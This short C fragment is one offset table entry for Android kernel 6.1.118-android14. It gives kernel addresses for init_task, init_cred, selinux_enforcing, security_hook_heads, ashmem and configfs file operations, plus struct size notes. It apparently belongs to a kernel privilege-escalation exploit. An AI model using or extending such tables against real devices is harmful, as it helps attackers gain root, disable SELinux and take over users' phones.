/* 6.1.118-android14-11-gca0ef6d17716-ab13624819 */

OFFSETS_ENTRY(
    "6.1.118-android14-11-gca0ef6d17716-ab13624819",
    STRUCT_OFFSETS_6_1,
    .pselect_waiter_shift = 1,
    .off_init_task = 0x01fdf600,
    .off_init_cred = 0x01ff1a68,
    .off_root_task_group = 0x021c6580,
    .off_selinux_enforcing = 0x022183d0,
    .off_selinux_blob_sizes = 0x015b3a48,
    .off_security_hook_heads = 0x015b3338,
    .off_slide_nfulnl_logger = 0x01fd29c8,
    .off_slide_boot_id = 0x02239458,
    .off_slide_loggers_0_1 = 0x01fd2918,
    .off_noop_llseek = 0x0039437c,
    .off_configfs_read_iter = 0x0045f3dc,
    .off_configfs_bin_write_iter = 0x0045f90c,
    .off_ashmem_ioctl = 0x00c28c34,
    .off_ashmem_fops = 0x0126bf80,
    /* ashmem_misc (this kernel's name) + offsetof(miscdevice, fops). */
    .off_ashmem_misc_fops = 0x0213b638,
),

/* BTF reference (runtime uses target.h defaults): */
/* #define STRUCT_PAGE_SIZE 0x40 */
/* #define STRUCT_PAGE_COMPOUND_HEAD 0x8 */
/* #define STRUCT_PAGE_TYPE 0x30 */
/* #define STRUCT_SLAB_CACHE 0x18 */
/* #define STRUCT_MM_STRUCT 0x3C0 */
